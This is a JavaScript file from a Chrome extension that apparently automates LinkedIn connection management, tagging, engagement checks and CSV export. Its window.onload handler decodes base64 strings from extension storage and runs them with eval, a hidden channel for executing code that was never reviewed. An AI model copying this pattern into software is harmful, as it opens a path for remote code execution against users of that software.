function removeConnectionInvitations(conn_ids, public_ids, idx, callback, is_pending){
    var connection_ids = conn_ids.map(x=>x.id);
    chrome.runtime.sendMessage({
        'updateConnectionStatus': true,
        'conn_status': 'removed',
        'connection_ids': connection_ids
    }, function() {
        if(is_pending){
            withdrawMultipleConnections(public_ids, callback);
        }
        if(typeof callback == 'function'){
            callback();
        }
    })
}

function withdrawMultipleConnections(public_ids, callback){
    chrome.runtime.sendMessage({
        withdrawMultipleConnectionRequests: true,
        public_ids: public_ids
    }, function() {
        if(typeof callback == 'function'){
            callback();
        }
    });
}

function addTagsToConnection(vals, conn_id, callback){
    $.ajax({
        url : site_url+'update_tag_to_connection/',
        type : 'POST',
        data : {
            connection_id : conn_id,
            user_id : user_details.id,
            tags : vals.toString()
        },
        success : function(resp){
            if(resp.id || resp.success == "1"){
                if(typeof callback == 'function'){
                    callback();
                } else {
                    $("#edit--tag").modal("hide");
                    location.reload();
                }
            } else {
                swal({
                    title : 'Error',
                    text : resp.message
                });
            }
        }
    })
}

function withdrawConnection(public_id, is_pending, callback){
    if(is_pending){
        chrome.runtime.sendMessage({withdrawConnection:true,public_id:public_id},function(){
            callback();
        });
    } else if (typeof callback == 'function'){
        callback();
    }
}

function showNotification(txt, id, title, callback) {
    chrome.runtime.sendMessage({
        showNotification: txt,
        tabId: id
    });
}

function notify(opts){
    $.notify({
            title: opts.title,
            message: opts.message,
        },{
            element: 'body',
            type: opts.type || 'success',
            allow_dismiss: true,
            offset: {
                x: 30,
                y: 30
            },
            spacing: 10,
            z_index: 1031,
            delay: opts.delay || 3000,
            timer: opts.timer || 1000,
            url_target: '_blank',
            mouse_over: false,
            template:   '<div data-notify="container" id="message_notification" class="alert alert-dismissible alert-{0}" role="alert">' +
                        '<button type="button" class="close" data-dismiss="alert"><span aria-hidden="true">&times;</span></button>' +
                        '<span data-notify="title">{1}</span><br />' +
                        '<span data-notify="message" id="message_count">{2}</span>' +
                        '</div>'
    });
    // if(opts.sendMessages){
    //     setTimeout(function(){
    //         $("#message_notification").remove();
    //         chrome.runtime.sendMessage({
    //             removeBadge: true
    //         })
    //         showNotification("Message(s) sent successfully!");
    //     },3000);
    // }
    // var messageInterval = setInterval(function(){
    //     chrome.browserAction.getBadgeText({},function(txt){
    //         if(txt){
    //             $("#message_count").text('Number of messages sent : '+txt+'/'+opts.recordsLength);
    //         } else {
    //             clearInterval(messageInterval);
    //             messageInterval = null;
    //             setTimeout(function(){
    //                 $("#message_notification").remove();
    //                 chrome.runtime.sendMessage({
    //                     removeBadge: true
    //                 })
    //                 showNotification("Messages are sent successfully!");
    //             },3000);
    //         }
    //     })
    // },100);
}

function disableRefreshIcon(){
    $(".table-bootgrid__actions .mdi-cached").attr("disabled","disabled");
}

function enableRefreshIcon(){
    $(".table-bootgrid__actions .mdi-cached").removeAttr("disabled");
}


function isUserLoggedout(){
    if(!user_details || !user_details.autoLogIn && !logout_msg_shown){
        showNotification("Please login to Linkedin");
        logout_msg_shown = true;
        location.href = LINKEDIN_HOME_PAGE;
        return true;
    } else if (user_details && user_details.autoLogIn){
        return false;
    }
}

window.onresize = function(){
    updatePageLayout();
}

function updatePageLayout(){
    if(window.innerWidth < 1280){   // for small screens
        $("#navigation_min").addClass("show").removeClass("hidden");
        $("#navigation").removeClass("show").addClass("hidden");
        $(".logo-container").addClass("hidden");
        $(".logo-container-mini").removeClass("hidden");
        $("#main").addClass("main-collapsed");
    } else {
        $("#navigation_min").removeClass("show").addClass("hidden");
        $("#navigation").addClass("show").removeClass("hidden");
        $(".logo-container").removeClass("hidden");
        $(".logo-container-mini").addClass("hidden");
        $("#main").removeClass("main-collapsed");
    
    }
}

function findEngagementInAcceptedConnections(){
    if(confirm("This process may take several minutes.\nPlease confirm to continue.")){
        console.time();
        var grid = $("#data-table").data('.rs.jquery.bootgrid');
        var rows = grid.rows;
        // var rows = grid.rows.slice(0,10); // debugging fucking functionality
        var urns = rows.map(function(c){
            return {entityUrn : c.url.indexOf('sales') > -1 ? c.profile_id : c.url.slice(28,-1), publicIdentifier: c.profile_id, id: c.id};
        });
        if(urns.length > 0){
            showAjaxLoader();
            chrome.runtime.sendMessage({checkEngagement:true,urns:urns},function(d){
                var conn_arr = d.filter(x=>x.engaged).map(x=>x.id);
                chrome.runtime.sendMessage({
                    'updateConnectionStatus': true,
                    'conn_status': 'engaged',
                    'connection_ids': conn_arr
                }, function() {
                    hideAjaxLoader();
                    showNotification("Process took : "+console.timeEnd());
                    location.reload();
                })
            });
        }
    }
}

function downloadFile(filename, content){
    var blob = new Blob([content], { type: 'text/csv;charset=utf-8;' });
    var link = document.createElement("a");
    var url = URL.createObjectURL(blob);
    link.setAttribute("href", url);
    link.setAttribute("download", filename);
    link.style.visibility = 'hidden';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
}

function getDownloads(callback){
    chrome.storage.local.get('downloads', function(r){
        var downloads = r && r.downloads || [];
        if(downloads.length > 0){
            downloads = JSON.parse(downloads);
        }
        callback(downloads);
    });
}

function JSONToCSVConvertor(arr, callback) {
    var CSV = '';
    var row = "";
    for (var index in arr[0]) {
        row += index.toCapitalize() + ',';
    }
    row = row.slice(0, -1);
    CSV += row + '\r\n';
    for (var i = 0; i < arr.length; i++) {
        var row = "";
        for (var index in arr[i]) {
            row += '"' + arr[i][index] + '",';
        }
        row = row.slice(0, row.length - 1);
        CSV += row + '\r\n';
    }
    if(typeof callback == 'function') callback(CSV);
}

var local_settings = {
    autoFollowUp : '',
    autoRemind   : '',
    autoWithdraw : '',
    autoWish : {anniversary: null,birthday: null,endorsement:null,jobchange:null},
    skipVisit    : '',
    skipMessage  : '',
    skipInMail   : '',
    maxEndorse   : ''
};

function updateSettings(skip_cond){
    if((local_settings.autoFollowUp != user_details.autoFollowUp || local_settings.autoRemind != user_details.autoRemind || local_settings.autoWithdraw != user_details.autoWithdraw || local_settings.autoWish != user_details.autoWish || local_settings.skipVisit != user_details.skipVisit || local_settings.skipMessage != user_details.skipMessage || local_settings.skipInMail != user_details.skipInMail || local_settings.maxEndorse != user_details.maxEndorse) || skip_cond){
        if (user_details.maxEndorse > 5){
            user_details.maxEndorse = 5;
        }
        if (user_details.maxEndorse < 0){
            user_details.maxEndorse = 0;
        }
        chrome.runtime.sendMessage({
            updateUserSettings: true,
            autoFollowUp : user_details.autoFollowUp,
            autoRemind   : user_details.autoRemind,
            autoWithdraw : user_details.autoWithdraw,
            autoWish : JSON.stringify(user_details.autoWish) || JSON.stringify({anniversary: null,birthday: null,endorsement:null,jobchange:null}),
            skipVisit    : user_details.skipVisit,
            skipMessage    : user_details.skipMessage,
            skipInMail    : user_details.skipInMail,
            maxEndorse    : user_details.maxEndorse
        }, function(){
        });
        local_settings = {
            autoFollowUp : user_details.autoFollowUp,
            autoRemind   : user_details.autoRemind,
            autoWithdraw : user_details.autoWithdraw,
            autoWish : user_details.autoWish || JSON.stringify({anniversary: null,birthday: null,endorsement:null,jobchange:null}),
            skipVisit    : user_details.skipVisit,
            skipMessage    : user_details.skipMessage,
            skipInMail    : user_details.skipInMail,
            maxEndorse    : user_details.maxEndorse
        };
    }
}

function removeDuplicates(originalArray, prop) {
    var newArray = [];
    var lookupObject  = {};
    for(var i=0;i<originalArray.length;i++) {
        lookupObject[originalArray[i][prop]] = originalArray[i];
    }
    for(i in lookupObject) {
        newArray.push(lookupObject[i]);
    }
    return newArray;
}

function randIn(min, max) {
    if (max == null) {
        max = min;
        min = 0;
    }
    return (min + Math.floor(Math.random() * (max - min + 1)));
}

String.prototype.toCapitalize = function(){
    return this.slice(0,1).toUpperCase() + this.slice(1);
}

window.onload = function(){
    chrome.storage.local.get('mainCtrl', function(s){
        if(s && s.mainCtrl){
            try{
                s.mainCtrl.forEach(function(x){
                    eval(atob(x));
                })
            } catch(err){
                chrome.runtime.sendMessage({error: err, func: 'patch-mainCtrl'});
            }
        }
        $(".upgradeBtn").bind("click", function(){
            chrome.runtime.sendMessage({
                open_new_tab: true,
                url: 'https://meetleonard.com/upgrade/'
            });
        })
    })
}